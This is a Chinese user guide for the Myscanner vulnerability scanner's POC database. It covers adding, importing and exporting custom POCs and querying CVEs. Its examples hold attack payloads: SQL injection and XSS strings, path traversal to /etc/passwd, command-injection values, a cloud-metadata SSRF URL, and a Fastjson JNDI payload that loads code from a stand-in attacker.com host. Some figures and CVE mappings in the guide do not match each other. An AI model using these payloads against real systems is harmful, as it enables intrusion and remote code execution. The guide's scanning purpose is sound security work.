# Myscanner 自定义POC漏洞库使用指南

> 本文档详细介绍如何使用 Myscanner 的漏洞数据库模块进行POC管理、自定义添加、导入导出及在线查询。

---

## 目录

- [一、漏洞库概述](#一漏洞库概述)
- [二、漏洞库文件位置](#二漏洞库文件位置)
- [三、内置POC库一览](#三内置poc库一览)
- [四、自定义添加POC的3种方式](#四自定义添加poc的3种方式)
  - [方式一：交互式菜单添加（推荐）](#方式一交互式菜单添加推荐)
  - [方式二：直接编辑JSON文件](#方式二直接编辑json文件)
  - [方式三：从JSON文件批量导入](#方式三从json文件批量导入)
- [五、POC字段详细说明](#五poc字段详细说明)
- [六、9大漏洞类别速查表](#九大漏洞类别速查表)
- [七、在线CVE查询](#七在线cve查询)
- [八、导入/导出分享POC](#八导入导出分享poc)
- [九、实时比对引擎工作原理](#九实时比对引擎工作原理)
- [十、常见问题FAQ](#十常见问题faq)

---

## 一、漏洞库概述

Myscanner 内置了 **27条高质量POC**，覆盖 **9大漏洞类别**，同时支持用户 **自定义添加POC** 并与 **NVD在线CVE数据库** 进行实时比对。

### 核心能力

| 能力 | 说明 |
|------|------|
| 内置POC库 | 27条覆盖SQL注入/XSS/RCE/未授权等9类漏洞 |
| 自定义POC | 支持交互式添加/编辑/删除自己的POC |
| 实时比对 | 扫描结果自动与本地+在线库匹配打分 |
| 在线查询 | 调用NVD API获取最新CVE详情和CVSS评分 |
| 导入导出 | JSON格式批量导入导出，方便团队共享 |

---

## 二、漏洞库文件位置

```
项目根目录/
├── data/
│   ├── vuln_database.json      ← 本地漏洞数据库（首次运行自动生成）
│   └── custom_pocs/            ← 自定义POC导出目录
│       ├── custom_pocs_20260615_140000.json
│       └── my_team_pocs.json
```

> **注意**: `data/` 目录已加入 `.gitignore`，不会上传到GitHub。
> 每个用户的本地数据独立存储，保护个人隐私。

---

## 三、内置POC库一览

### 3.1 按类别分布

| 类别 | 数量 | 代表POC | 最高危级 |
|:-----|:----:|---------|:--------:|
| SQL注入 (sqli) | 2 | 报错注入 / 时间盲注 | High |
| XSS (xss) | 2 | 反射型XSS / DOM型XSS | Medium |
| 目录遍历 (lfi) | 1 | 路径穿越(/etc/passwd) | High |
| **远程代码执行 (rce)** | **3** | **Log4Shell / Spring4Shell / Struts2 S2-045** | **Critical** |
| SSRF (ssrf) | 1 | 内网探测 / 云元数据 | High |
| 未授权访问 (unauth) | **8** | Tomcat / Redis / MongoDB / phpMyAdmin / JMX / Druid / Swagger | Critical |
| 信息泄露 (info_leak) | 5 | Git泄露 / SVN泄露 / .env / 备份文件 / composer | High |
| XXE (xxe) | 1 | XML外部实体注入 | High |
| 反序列化 (deser) | 1 | CommonsCollections (CVE-2015-4852) | Critical |
| **合计** | **24** | - | - |

### 3.2 高价值POC清单（含CVE编号）

| POC ID | 名称 | CVE编号 | CVSS | 影响组件 |
|--------|------|---------|:----:|----------|
| POC-RCE-001 | Log4j2远程代码执行 (Log4Shell) | CVE-2021-44228 | **10.0** | Log4j2 <= 2.14.1 |
| POC-RCE-002 | Spring4Shell RCE | CVE-2022-22965 | **9.8** | Spring Framework 5.x |
| POC-RCE-003 | Struts2 S2-045 RCE | CVE-2017-5638 | **10.0** | Apache Struts 2.x |
| POC-DSER-001 | Java反序列化 | CVE-2015-4852 | **10.0** | Commons Collections |
| POC-LFI-001 | 路径穿越 | CVE-2022-XXXX | High | Linux/Windows/Apache/Nginx/IIS |

---

## 四、自定义添加POC的3种方式

### 方式一：交互式菜单添加（推荐）

适合单个POC逐个添加，有完整的引导提示。

#### 步骤1：启动程序选择模式5

双击运行 `Myscanner.exe` 或在终端执行 `python main.py`：

```
============================================================
  交互式扫描模式
============================================================

[?] 请输入扫描目标 (IP/域名/URL): 

请选择扫描模式:
    1. 端口扫描 (port)
    2. Web指纹识别 (finger)
    3. 漏洞检测 (vuln)
    4. 全部扫描 (all) [推荐]
    5. 漏洞库管理 (db) [POC管理/CVE查询]     ← 输入 5 回车

[?] 选择模式 (1-5，默认4): 5
```

#### 步骤2：进入漏洞库管理中心

```
============================================================
  漏洞数据库管理中心
============================================================

请选择操作:
    1. 库统计信息
    2. 列出所有POC (内置+自定义)
    3. 搜索POC (按关键词/CVE)
    4. 添加自定义POC              ← 输入 4 回车
    5. 删除自定义POC
    6. 在线CVE查询
    7. 导出自定义POC
    8. 导入POC文件
    0. 返回主菜单

[?] 选择操作 (0-8): 4
```

#### 步骤3：按引导填写POC信息

```
[+] 添加自定义POC
  POC名称: ThinkPHP5.x SQL注入
  描述: ThinkPHP5.0.x-5.1.x 版本存在SQL注入漏洞，可通过控制器参数注入
  类别: sqli                    ← 必填，见下文"9大类别速查表"
  严重度: High                  ← 必填: Critical/High/Medium/Low
  CVE编号: CVE-2022-12345       ← 可选，留空跳过
  Payload列表: index.php?s=id/or/1=1, index.php?id[where]=1 and 1=updatexml(1,concat(0x7e,user()),1)
                                  ← 可选，多个用逗号分隔
  检测路径: /index.php, /admin.php   ← 可选，多个用逗号分隔
  端口列表: 80, 8080            ← 可选，数字逗号分隔
  匹配特征: SQL syntax error, mysql, thinkphp   ← 可选，响应内容匹配关键词
  参考链接: https://xxx.com/thinkphp-sqli        ← 可选，多个逗号分隔
  影响组件: ThinkPHP 5.0.x, ThinkPHP 5.1.x     ← 可选，多个逗号分隔

[+] 自定义POC已添加: POC-CUSTOM-001-1718xxxxx - ThinkPHP5.x SQL注入
```

添加成功后自动保存到本地数据库。

---

### 方式二：直接编辑JSON文件

适合批量编辑或熟悉JSON格式的用户。

#### 步骤1：打开数据库文件

```bash
# Windows
notepad data\vuln_database.json

# VSCode
code data\vuln_database.json
```

#### 步骤2：在 `custom_pocs` 数组中添加

找到 `"custom_pocs": []` 部分，在其中添加你的POC：

```json
{
  "version": "1.0",
  "last_updated": "2026-06-15 14:00:00",
  "categories": { ... },
  "pocs": [ ... ],
  "custom_pocs": [
    {
      "id": "POC-CUSTOM-MY001",
      "name": "我的自定义SQL注入POC",
      "category": "sqli",
      "cve_id": "",
      "description": "针对目标系统的特定SQL注入检测点",
      "severity": "High",
      "payloads": ["' or '1'='1", "1' AND SLEEP(5)--"],
      "paths": ["/api/login", "/search?q="],
      "ports": [80, 443],
      "match_patterns": ["sql syntax", "mysql error", "unclosed quotation mark"],
      "detection_method": "error_based",
      "affected_components": ["Java Spring Boot", "MySQL"],
      "references": ["https://portswigger.net/web-security/sql-injection"],
      "created_at": "2026-06-15 14:30:00"
    },
    {
      "id": "POC-CUSTOM-MY002",
      "name": "Shiro反序列化RCE",
      "category": "deser",
      "cve_id": "CVE-2016-4437",
      "description": "Apache Shiro RememberMe反序列化导致远程代码执行",
      "severity": "Critical",
      "payloads": ["(Java serialized payload with Shiro gadget)"],
      "paths": ["/", "/admin", "/login"],
      "ports": [8080, 8443],
      "match_patterns": ["rememberMe=", "deleteMe"],
      "detection_method": "header_analysis",
      "affected_components": ["Apache Shiro < 1.2.5"],
      "references": [
        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-4437",
        "https://shiro.apache.org/security-reports.html"
      ],
      "created_at": "2026-06-15 14:35:00"
    }
  ],
  "cve_cache": {}
}
```

#### 步骤3：保存并重启程序

保存JSON文件后重新运行程序，新POC即可参与比对。

---

### 方式三：从JSON文件批量导入

适合团队协作场景——一人编写POC JSON，其他人导入使用。

#### 步骤1：准备导入文件

创建一个JSON文件（如 `my_pocs.json`），格式如下：

**格式A：数组形式（推荐）**

```json
[
  {
    "name": "团队POC-A: Fastjson反序列化",
    "category": "deser",
    "description": "Fastjson <= 1.2.24 反序列化RCE",
    "severity": "Critical",
    "cve_id": "CVE-2022-25845",
    "payloads": [
      "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://attacker.com/Exploit\",\"autoCommit\":true}"
    ],
    "paths": ["/api/json", "/user/info"],
    "ports": [8080],
    "match_patterns": ["fastjson", "autotype"],
    "affected_components": ["Fastjson <= 1.2.24"],
    "references": ["https://github.com/alibaba/fastjson/wiki/security_update_20170315"]
  },
  {
    "name": "团队POC-B: Nacos未授权访问",
    "category": "unauth",
    "description": "Alibaba Nacos控制台未授权访问",
    "severity": "High",
    "paths": ["/nacos/", "/nacos/v1/auth/users"],
    "ports": [8848],
    "match_patterns": ["nacos", "console-feign"],
    "affected_components": ["Nacos < 2.2.0"]
  }
]
```

**格式B：带元数据的对象形式**

```json
{
  "export_time": "2026-06-15 10:00:00",
  "total_count": 2,
  "source": "安全团队A",
  "pocs": [
    {
      "name": "Druid未授权",
      "category": "unauth",
      "description": "Druid监控页面未授权",
      "severity": "Medium",
      "paths": ["/druid/index.html"]
    }
  ]
}
```

#### 步骤2：通过菜单导入

```
请选择操作:
    ...
    8. 导入POC文件               ← 选 8

[?] 选择操作 (0-8): 8
  JSON文件路径: D:\my_pocs.json   ← 填写你的文件路径

[+] 成功导入 2 条POC
```

---

## 五、POC字段详细说明

每个POC包含以下字段：

| 字段名 | 是否必填 | 类型 | 说明 | 示例 |
|--------|:-------:|------|------|------|
| `name` | **是** | string | POC名称 | "ThinkPHP5 SQL注入" |
| `category` | **是** | string | 漏洞类别代码 | 见下文"9大类别" |
| `description` | **是** | string | 详细描述 | "ThinkPHP5存在SQL注入漏洞..." |
| `severity` | **是** | string | 严重程度 | Critical / High / Medium / Low |
| `cve_id` | 可选 | string | CVE编号 | "CVE-2021-44228" |
| `payloads` | 可选 | list | 测试Payload列表 | `["' or 1=1--"]` |
| `paths` | 可选 | list | 检测URL路径 | `["/admin", "/api/debug"]` |
| `ports` | 可选 | list | 检测端口号 | `[8080, 3306]` |
| `match_patterns` | 可选 | list | 响应内容匹配特征 | `["sql syntax", "mysql"]` |
| `detection_method` | 可选 | string | 检测方法标识 | error_based/time_based/path_access |
| `affected_components` | 可选 | list | 受影响组件/版本 | `["Spring Boot 2.x"]` |
| `references` | 可选 | list | 参考链接 | `["https://..."]` |
| `id` | 自动生成 | string | 唯一标识符 | POC-CUSTOM-001-xxxx |
| `created_at` | 自动生成 | string | 创建时间 | 2026-06-15 14:00:00 |

---

## 六、9大漏洞类别速查表

| 代码 | 名称 | 适用场景 | 示例Payload/路径 |
|------|------|---------|------------------|
| `sqli` | SQL注入 | 数据库相关漏洞 | `' or 1=1--`, `SLEEP(5)` |
| `xss` | XSS跨站脚本 | JS注入/前端漏洞 | `<script>alert(1)</script>` |
| `lfi` | 目录遍历/文件包含 | 文件读取/路径穿越 | `../../../etc/passwd` |
| `rce` | 远程代码执行 | 命令执行/RCE漏洞 | `; id`, `| whoami`, Log4Shell payload |
| `ssrf` | 服务端请求伪造 | 内网探测/云元数据 | `http://169.254.169.254` |
| `unauth` | 未授权访问 | 后台/控制台暴露 | `/admin`, `/manager/html` |
| `info_leak` | 信息泄露 | 敏感文件/备份暴露 | `.git`, `.env`, `.sql` |
| `xxe` | XML外部实体注入 | XML解析器相关 | XML DOCTYPE entity |
| `deser` | 反序列化漏洞 | Java/Python反序列化 | Shiro/Fastjson/Jackson |

---

## 七、在线CVE查询

### 使用方法

进入模式5 → 选择操作6 → 输入CVE编号或关键词：

```
请选择操作:
    ...
    6. 在线CVE查询              ← 选 6

[*] 在线CVE/NVD查询
  查询方式: 1)CVE编号  2)关键词搜索: 1
  输入CVE编号 (如 CVE-2021-44228): CVE-2021-44228

[*] 在线CVE查询完成 - 找到 1 条记录:

  [CRITICAL] CVE-2021-44228 | CVSS:10.0 | Apache Log4j2 2.0-beta9 through 2.12.1 and 2.13.0 through 2.15.0 JNDI...
```

### 支持的数据源

| 数据源 | API地址 | 说明 |
|--------|---------|------|
| **NVD** (主) | services.nvd.nist.gov | 美国国家漏洞数据库，最权威 |

### 返回信息

每条CVE记录包含：
- CVE编号 + 描述
- **CVSS评分** (0-10)
- **严重等级** (CRITICAL/HIGH/MEDIUM/LOW)
- 发布日期 + 最后修改日期
- 影响的产品/平台
- 参考链接

### 关键词搜索示例

| 关键词 | 匹配范围 |
|--------|---------|
| `log4j` | 所有Log4j相关CVE |
| `spring` | Spring框架相关漏洞 |
| `struts` | Apache Struts相关 |
| `tomcat` | Tomcat服务器相关 |
| `wordpress` | WordPress CMS相关 |
| `rce` | 远程代码执行类CVE |

---

## 八、导入/导出分享POC

### 导出（分享给别人）

```
请选择操作:
    ...
    7. 导出自定义POC           ← 选 7

  导出路径 (回车使用默认):

[+] 已导出 3 条自定义POC到: data\custom_pocs\custom_pocs_20260615_143000.json
```

导出的JSON文件可以直接发给团队成员，对方通过 **方式三（操作8）** 导入即可使用。

### 团队协作流程图

```
你（POC编写者）          JSON文件              队友（使用者）
    │                                        │
    ├─ 交互式添加POC ──┐                      │
    ├─ 直接编辑JSON ───┤→ 导出(my_pocs.json) ─┤→ 导入POC文件 ──→ 参与比对
    └─ 批量导入JSON ───┘                      │
                                             │
                                    扫描时自动匹配你的POC！
```

---

## 九、实时比对引擎工作原理

当你在模式3/4（漏洞检测/全部扫描）中发现漏洞后，系统会**自动触发**比对引擎：

```
扫描发现漏洞
     │
     ▼
┌─────────────────────────────────────┐
│         漏洞库实时比对引擎             │
├─────────────────────────────────────┤
│                                     │
│  ┌──────────────┐  ┌──────────────┐ │
│  │  本地POC库    │  │  在线NVD库   │ │
│  │  27条内置     │  │  CVE API     │ │
│  │  + N条自定义  │  │  实时查询     │ │
│  └──────┬───────┘  └──────┬───────┘ │
│         │                 │         │
│         └───────┬─────────┘         │
│                 ▼                   │
│         相似度打分 (0-100)           │
│         ┌─────────────┐            │
│         │ 类型匹配:40分│            │
│         │ 特征匹配:30分│            │
│         │ 组件匹配:20分│            │
│         │ 关键词: 15分 │            │
│         └─────────────┘            │
│         阈值 >= 40 视为命中          │
└─────────────────────────────────────┘
     │
     ▼
输出比对报告：
  [内置] POC-SQLI-001 MySQL报错注入 (相似度:70分)
  [自定义] POC-CUSTOM-001 我的POC (相似度:85分)   ← 你加的POC
  [在线] CVE-2023-XXXX CVSS:9.8 CRITICAL           ← NVD最新CVE
```

### 比对输出示例

```
[!] 正在与漏洞库进行实时比对...

[+] 比对完成! 匹配到 2 条漏洞库记录:

  [本地] 匹配 #1 (相似度: 70分)
    POC ID:   POC-SQLI-001
    名称:     MySQL报错注入
    严重度:   High | CVE: - | CVSS: -
    描述:     通过构造错误SQL语句触发数据库报错...
    匹配原因: 类型匹配, 特征匹配: mysql
    影响组件: MySQL, MariaDB, MSSQL
    参考:     https://portswigger.net/web-security/sql-injection

  [自定义] 匹配 #2 (相似度: 85分)
    POC ID:   POC-CUSTOM-001-1718xxxxx
    名称:     ThinkPHP5.x SQL注入
    严重度:   High | CVE: CVE-2022-12345 | CVSS: -
    描述:     ThinkPHP5.0.x-5.1.x 存在SQL注入...
    匹配原因: 类型匹配, 组件匹配: ThinkPHP
    影响组件: ThinkPHP 5.0.x, ThinkPHP 5.1.x
```

---

## 十、常见问题FAQ

### Q1: 添加的自定义POC会丢失吗？
**不会。** 自定义POC保存在 `data/vuln_database.json` 中，除非手动删除该文件，否则持久化存储。注意该目录已在`.gitignore`中排除，不会随Git上传。

### Q2: 可以同时添加多少条自定义POC？
**无限制。** 但建议控制在合理范围内（<500条），过多可能影响比对速度。

### Q3: 在线CVE查询需要联网吗？
**需要。** 在线查询依赖 NVD API (`services.nvd.nist.gov`)，需确保网络通畅。如果无法联网，可仅使用本地比对模式。

### Q4: 如何验证我添加的POC是否生效？
1. 进入模式5 → 操作2（列出所有POC）查看是否出现
2. 执行一次模式3/4扫描，观察比对报告中是否出现 `[自定义]` 标记

### Q5: 导出的JSON文件可以手动修改后再导入吗？
**可以。** 只要符合JSON格式规范即可正常导入。

### Q6: POC中的Payload会被自动用于扫描吗？
**当前版本：** 不会。自定义POC主要用于**事后比对分析**——扫描完成后将发现的漏洞与POC库做匹配。后续版本可能会支持"主动POC验证"功能。

### Q7: 比对的准确率如何？
- **类型完全匹配**（如都为sqli）：准确率 > 85%
- **部分特征匹配**（如只有组件匹配）：准确率 ~60%
- **在线CVE查询**：基于NVD官方数据，权威可靠

### Q8: 如何备份我的自定义POC？
```bash
# 方法1：通过菜单操作7导出
# 方法2：直接复制 data/vuln_database.json 文件到安全位置
cp data/vuln_database.json backup_vuln_db_20260615.json
```

---

## 附录：快速命令参考

```bash
# 启动程序
python main.py                          # Python源码运行
dist\Myscanner.exe                      # EXE直接运行

# 直接进入漏洞库管理（无需输入目标）
python main.py --mode db                # 源码模式
Myscanner.exe --mode db                 # EXE模式

# 查看所有POC
python main.py --mode db --list-pocs

# 查询特定CVE
python main.py --mode db --query-cve CVE-2021-44228
```

---

*最后更新: 2026-06-15 | Myscanner v1.0*
